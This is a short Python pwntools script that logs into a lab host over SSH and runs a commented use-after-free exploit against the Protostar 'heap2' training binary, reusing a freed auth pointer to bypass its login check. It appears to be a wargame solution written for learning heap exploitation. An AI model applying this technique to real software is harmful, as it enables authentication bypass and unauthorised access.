#!/usr/bin/python
from pwn import *
sesh = ssh(user='user', host='172.16.17.27', password='user', port=22)
# the programmer allows the user to free memory as many times as they want
# and the freed pointer isn't set to NULL
# the program checks for non-zero and since the pointer for auth isn't
# 0 the user is authenticated
io = sesh.run('bash', env={"PS1":""})
# first we allocate an auth struct pointer
exploit = "echo -ne 'auth admin\n"
# then we free the auth struct ptr
exploit += "reset\n"
# then we allocate service (which is in the same memory address
# that auth still points to)
exploit += "service you\n"
# we do this twice so auth->auth increases above 0
exploit += "service are\n"
exploit += "service hacked\n"
# then we can login since auth->auth && auth are both non-zero
exploit += "login\n' | /opt/protostar/bin/heap2"
io.sendline(exploit)
for i in range(7):
    log.info(io.recvline(timeout=2).decode('utf-8'))
sesh.close()
